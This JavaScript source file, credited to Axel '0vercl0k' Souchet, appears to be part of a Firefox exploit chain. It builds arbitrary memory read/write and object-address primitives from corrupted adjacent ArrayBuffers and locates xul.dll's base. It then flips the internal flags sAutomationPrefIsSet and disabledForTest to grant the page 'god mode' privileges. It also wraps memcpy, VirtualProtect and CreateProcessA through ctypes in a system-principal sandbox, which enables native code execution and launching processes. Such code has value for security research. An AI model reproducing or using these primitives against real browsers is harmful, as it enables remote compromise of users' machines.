// Axel '0vercl0k' Souchet - 19 November 2019

//
// Scan back page, by page until finding the base of the module
// Address belongs to.
//

function FindModuleBase(Memory, Address) {
    let Base = Address.and(new Long(0xfffff000, 0xffffffff));
    while(1337) {
        const MZ = Array.from(Memory.Read(Base, 2)).map(
            c => String.fromCharCode(c)
        ).join('');

        if(MZ == 'MZ') {
            break;
        }

        Base = Base.sub(0x1000);
    }

    return Base;
}

//
// This function returns a set of read/write primitives built off two consecutive ArrayBuffers.
//

function BuildPrimitives(AB1, AB2) {
    const Read = (Addr, Length) => {
        let OddOffset = 0;
        if((Addr.and(0x1)).equals(1)) {
            Length += 1;
            OddOffset = 1;
        }

        //
        // Fix AB2's base address from AB1.
        //

        Addr = Addr.shiftRight(1);
        const Master = new Uint8Array(AB1);
        for(const [Idx, Byte] of Addr.toBytes(true).entries()) {
            Master[Idx + 0x40] = Byte;
        }

        const View = new Uint8Array(AB2);
        return View.slice(OddOffset, Length);
    };

    const Write = (Addr, Values) => {
        let OddOffset = 0;
        if((Addr.and(0x1)).equals(1)) {
            OddOffset = 1;
        }

        //
        // Fix AB2's base address from AB1.
        //

        Addr = Addr.shiftRight(1);
        const Master = new Uint8Array(AB1);
        for(const [Idx, Byte] of Addr.toBytes(true).entries()) {
            Master[Idx + 0x40] = Byte;
        }

        const View = new Uint8Array(AB2);
        for(const [Idx, Byte] of Values.entries()) {
            View[OddOffset + Idx] = Number(Byte);
        }
    };

    const ReadPtr = Addr => {
        return Long.fromBytes(Read(Addr, 8), true, true);
    };

    const Read32 = Addr => {
        return Long.fromBytes(Read(Addr, 4), true, true);
    };

    const ReadString = Addr => {
        let S = '';
        while(1337) {
            const Byte = Read(Addr, 1);
            Addr = Addr.add(1);
            if(Byte == 0) {
                break;
            }

            S += String.fromCharCode(Number(Byte));
        }
        return S;
    };

    const WritePtr = (Addr, Ptr) => {
        return Write(Addr, Ptr.toBytes(true));
    };

    const AddrOf = Obj => {
        AB2.hell_on_earth = Obj;
        const SlotsAddress = Long.fromBytes(
            new Uint8Array(AB1).slice(48, 48 + 8),
			true, true
        );
        return ReadPtr(SlotsAddress).and(0x0000ffffffffffff);
    };

    return {
        Read : Read,
        Read32 : Read32,
        ReadPtr : ReadPtr,
        ReadString : ReadString,
        Write : Write,
        WritePtr : WritePtr,
        AddrOf : AddrOf,
    };
}

//
// This function implements msvcrt!memcpy with the `ctypes` JS module.
//

function memcpy(Dst, Src) {
    function _memcpy(Dst, Src) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const msvcrt = ctypes.open('msvcrt.dll');

        const FunctPtr = msvcrt.declare('memcpy',
            ctypes.winapi_abi,
            ctypes.voidptr_t,
            ctypes.uintptr_t,
            ctypes.char.ptr,
            ctypes.size_t
        );

        const Dest = new ctypes.uintptr_t(Dst.toString());
        const Source = new Uint8Array(Src);
        const Num = new ctypes.size_t(Src.length);

        const Success = FunctPtr(Dest, Source, Num);
        msvcrt.close();
        return Success;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _memcpy.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const Ret = Sbx._memcpy(Dst.toString(), Src);
    Cu.nukeSandbox(Sbx);
    return Ret
}

//
// This function implements kernelbase!VirtualProtect with the `ctypes` JS module.
//

function VirtualProtect(Address, Size, NewProtect) {
    function _VirtualProtect(Address, Size, NewProtect) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const kernelbase = ctypes.open('kernelbase.dll');

        const FunctPtr = kernelbase.declare('VirtualProtect',
            ctypes.winapi_abi,
            ctypes.bool,
            ctypes.uintptr_t,
            ctypes.uintptr_t,
            ctypes.uint32_t,
            ctypes.uint32_t.ptr
        );
        const Dest = new ctypes.uintptr_t(Address.toString());
        const OldNewProtect = new ctypes.uint32_t(0);
        const Success = FunctPtr(Dest, Size, NewProtect, OldNewProtect.address());
        kernelbase.close();
        return [Success, OldNewProtect];
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _VirtualProtect.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const [Success, OldNewProtect] = Sbx._VirtualProtect(Address.toString(), Size, NewProtect);
    Cu.nukeSandbox(Sbx);
    return [Success, OldNewProtect];
}

//
// This function implements kernelbase!CreateProcessA with the `ctypes` JS module.
//

function CreateProcessA(CommandLine) {
    function _CreateProcess(CommandLine) {
        const { ctypes } = Components.utils.import('resource://gre/modules/ctypes.jsm');
        const kernelbase = ctypes.open('kernelbase.dll');

        // typedef struct _STARTUPINFOA {
        //   DWORD  cb;
        //   LPSTR  lpReserved;
        //   LPSTR  lpDesktop;
        //   LPSTR  lpTitle;
        //   DWORD  dwX;
        //   DWORD  dwY;
        //   DWORD  dwXSize;
        //   DWORD  dwYSize;
        //   DWORD  dwXCountChars;
        //   DWORD  dwYCountChars;
        //   DWORD  dwFillAttribute;
        //   DWORD  dwFlags;
        //   WORD   wShowWindow;
        //   WORD   cbReserved2;
        //   LPBYTE lpReserved2;
        //   HANDLE hStdInput;
        //   HANDLE hStdOutput;
        //   HANDLE hStdError;
        // } STARTUPINFOA, *LPSTARTUPINFOA;
        const STARTUPINFOA = new ctypes.StructType('STARTUPINFOA', [
            { 'cb' : ctypes.uint32_t },
            { 'lpReserved' : ctypes.char.ptr },
            { 'lpDesktop' : ctypes.char.ptr },
            { 'lpTitle' : ctypes.char.ptr },
            { 'dwX' : ctypes.uint32_t },
            { 'dwY' : ctypes.uint32_t },
            { 'dwXSize' : ctypes.uint32_t },
            { 'dwYSize' : ctypes.uint32_t },
            { 'dwXCountChars' : ctypes.uint32_t },
            { 'dwYCountChars' : ctypes.uint32_t },
            { 'dwFillAttribute' : ctypes.uint32_t },
            { 'dwFlags' : ctypes.uint32_t },
            { 'wShowWindow' : ctypes.uint16_t },
            { 'cbReserved2' : ctypes.uint16_t },
            { 'lpReserved2' : ctypes.voidptr_t },
            { 'hStdInput' : ctypes.voidptr_t },
            { 'hStdOutput' : ctypes.voidptr_t },
            { 'hStdError' : ctypes.voidptr_t }
        ]);

        // typedef struct _PROCESS_INFORMATION {
        //     HANDLE hProcess;
        //     HANDLE hThread;
        //     DWORD  dwProcessId;
        //     DWORD  dwThreadId;
        //   } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
        const PROCESS_INFORMATION = new ctypes.StructType('PROCESS_INFORMATION', [
            { 'hProcess' : ctypes.voidptr_t },
            { 'hThread' : ctypes.voidptr_t },
            { 'dwProcessId' : ctypes.uint32_t },
            { 'dwThreadId' : ctypes.uint32_t },
        ]);

        // BOOL CreateProcessA(
        //     LPCSTR                lpApplicationName,
        //     LPSTR                 lpCommandLine,
        //     LPSECURITY_ATTRIBUTES lpProcessAttributes,
        //     LPSECURITY_ATTRIBUTES lpThreadAttributes,
        //     BOOL                  bInheritHandles,
        //     DWORD                 dwCreationFlags,
        //     LPVOID                lpEnvironment,
        //     LPCSTR                lpCurrentDirectory,
        //     LPSTARTUPINFOA        lpStartupInfo,
        //     LPPROCESS_INFORMATION lpProcessInformation
        //   );
        const FunctPtr = kernelbase.declare('CreateProcessA',
            ctypes.winapi_abi,
            ctypes.bool,
            ctypes.voidptr_t,
            ctypes.char.ptr,
            ctypes.voidptr_t,
            ctypes.voidptr_t,
            ctypes.bool,
            ctypes.uint32_t,
            ctypes.voidptr_t,
            ctypes.voidptr_t,
            STARTUPINFOA.ptr,
            PROCESS_INFORMATION.ptr
        );

        const ApplicationName = new ctypes.voidptr_t(0);
        const ProcessAttributes = new ctypes.voidptr_t(0);
        const ThreadAttributes = new ctypes.voidptr_t(0);
        const InheritHandles = new ctypes.bool(false);
        const CreationFlags = new ctypes.uint32_t(0);
        const Environment = new ctypes.voidptr_t(0);
        const CurrentDirectory = new ctypes.voidptr_t(0);
        const StartupInfo = new STARTUPINFOA();
        StartupInfo.cb = STARTUPINFOA.size;
        const ProcessInformation = new PROCESS_INFORMATION();

        const Success = FunctPtr(
            ApplicationName,
            CommandLine,
            ProcessAttributes,
            ThreadAttributes,
            InheritHandles,
            CreationFlags,
            Environment,
            CurrentDirectory,
            StartupInfo.address(),
            ProcessInformation.address()
        );

        kernelbase.close();
        return Success;
    }

    const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
    const Cu = Components.utils;
    const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());
    const Code = _CreateProcess.toSource();
    Cu.evalInSandbox(Code, Sbx);
    const Ret = Sbx._CreateProcess(CommandLine);
    Cu.nukeSandbox(Sbx);
    return Ret
}

//
// This function gives god mode to the current page.
//

function GodMode(AB1, AB2, Primitives, XulsAutomationPrefIsSet, XuldisabledForTest) {
    if(Primitives == undefined) {

        //
        // Build up the primitives to be able to get to work.
        //

        Primitives = BuildPrimitives(AB1, AB2);
    }

    //
    // Find js/xul base address
    //

    const EmptyElementsHeaders = Long.fromBytes(
        new Uint8Array(AB1).slice(0x38, 0x38 + 8),
		true, true
    );
    const JSBase = FindModuleBase(Primitives, EmptyElementsHeaders);
    dbg('[+] xul.dll is @ ' + JSBase.toString(16));

    const XulsAutomationPrefIsSetAddress = JSBase.add(XulsAutomationPrefIsSet);
    dbg(`Snipping xul!sAutomationPrefIsSet @ ${XulsAutomationPrefIsSetAddress.toString(16)}`);
    Primitives.Write(XulsAutomationPrefIsSetAddress, [1]);

    const XuldisabledForTestAddress = JSBase.add(XuldisabledForTest);
    dbg(`Snipping xul!XuldisabledForTestAddress @ ${XuldisabledForTestAddress.toString(16)}`);
    Primitives.Write(XuldisabledForTestAddress, [1]);
}
